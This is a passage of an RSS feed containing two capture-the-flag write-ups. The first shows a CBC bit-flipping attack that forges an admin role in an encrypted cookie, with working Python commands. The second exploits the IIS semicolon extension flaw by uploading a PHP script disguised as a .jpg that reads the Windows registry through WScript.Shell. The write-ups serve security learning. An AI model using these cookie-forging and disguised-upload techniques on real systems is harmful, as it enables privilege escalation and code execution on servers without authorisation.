<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('x00')
    &gt;&gt;&gt; username, role = get_message(iv, cipher)
    'Welcome back, x00##role=userx00x00x00x00x00x00x00x00x00x00x00! Your role is: . You need admin role.'
</pre>

<p>You can see the last 11 bytes of the plain text in the returned message. So, at this time, we can conclude format of the plain text is:</p>

<blockquote>
  <p>‘username=’ + username + ‘##role=’ + role</p>
</blockquote>

<p>Now, the last thing we have to do is altering the role value to ‘admin’. Because we’ve already known the format of the plain text, we can choose to input the username close to the target plain text and try to alter the cipher text in the way that the decrypted value is what we want.</p>

<p>Let remind the operation of CBC mode in cryptographic ciphers. In encryption process:</p>

<blockquote>
  <p>y[1] = C(IV xor x[1])<br />
y[n] = C(y[n-1] xor x[n])</p>
</blockquote>

<p>and in the decryption:</p>

<blockquote>
  <p>x[1] = D(y[1]) xor IV<br />
x[n] = D(y[n]) xor y[n-1]</p>
</blockquote>

<p>Notice that if we flip one bit in the (n-1)th block of cipher text, the respective bit in the n-th block of plain text will be also flipped. So, we will you this fact to exploit the challenge:</p>

<pre class="brush: python; title: ; notranslate" title="">&gt;&gt;&gt; iv, cipher = get_cookie('012345678901234567890123#role=admin')
    &gt;&gt;&gt; s = cipher[:16] + chr(ord(cipher[16]) ^ 0x10) + cipher[17:]
    &gt;&gt;&gt; username, role = get_message(iv, s)
    'Welcome back, 0123456Lxaax17mxe9x91xdcxe2`#z)xd8mxd8x18! Your role is: admin. You need admin role. Congratulations! Here is your flag: the_magic_words_are_squeamish_ossifrage_^-^!!!!!'
</pre>

<p>Successful! Such an interesting challenge, isn’t it?</p>

<h3 id="references">References</h3>

<ul>
  <li><a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation" target="_blank">Block cipher modes of operation</a></li>
  <li><a href="http://en.wikipedia.org/wiki/Bit-flipping_attack" target="_blank">Bit-flipping attack</a></li>
</ul>

  ]]></description>
</item>

	<item>
  <title>Codegate 2010 Challenge 11 writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/18/codegate-2010-challenge-11-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-18T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/18/codegate-2010-challenge-11-writeup.html</guid>
  <description><![CDATA[
     <h2 id="Summary" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Summary<a title="Link to this section" href="#Summary"></a>
</h2>

<p><a href="http://ctf6.codegate.org/31337_/index.html"><span> </span>http://ctf6.codegate.org/31337_/index.html</a></p>

<p>Get a value of HKLMSoftwarecodegate2010, it’s the flag.</p>

<h2 id="Analysis" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Analysis<a title="Link to this section" href="#Analysis"></a>
</h2>

<p>At first when accessing the url, it shows up a page allow you to upload a jpeg image and only .jpg files. As I noticed, it serves by IIS. Suddenly, I remember of the vulnerability of IIS in processing image files. A little bit google show me the result. Ah ha, let’s test it by uploading a php file likes “test.php;.jpg”. Incredible!</p>

<p style="text-indent: 0.5em">
  Now, the only thing we have to do is writing some lines of php to read the REG key.
</p>

<pre style="background-color: #f7f7f7;margin-top: 1em;margin-right: 1.75em;margin-bottom: 1em;margin-left: 1.75em;padding: 0.25em;border: 1px solid #d7d7d7">regprint.php;.jpg
&lt;?
$shell = new COM("WScript.Shell") or die("Requires Windows Scripting Host");
$devenvpath=$shell-&gt;RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\codegate2010");
echo $devenvpath
?&gt;</pre>

<p>Then, execute it by <a href="http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg"><span> </span>http://ctf6.codegate.org/31337_/upload/regprint.php;.jpg</a></p>

<p style="text-indent: 0.5em">
  <tt>LollerSkaterz_From_RoflCopters_With_Guinness</tt>
</p>

<p style="text-indent: 0.5em">
  Easy game with 1200 point.
</p>

<h2 id="Vulnerability" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  Vulnerability<a title="Link to this section" href="#Vulnerability"></a>
</h2>

<p>In facts, after the game thaidn said that it’s a fault of deploying the challenge, it’s designed to be passed by a 0-day of core php.</p>

<h2 id="References" style="font-family: Georgia, 'Bitstream Vera Serif', 'New York', Palatino, serif;font-weight: normal;letter-spacing: -0.018em;font-size: 20px;clear: none;color: #366d9c;border-bottom-width: 1px;border-bottom-style: solid;border-bottom-color: #ffdb4c;margin: 0px">
  References<a title="Link to this section" href="#References"></a>
</h2>

<ul>
  <li><a href="http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/"><span> </span>http://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/</a></li>
  <li>Keywords: IIS, semi-colon vulnerability</li>
</ul>


  ]]></description>
</item>

</channel>
</rss>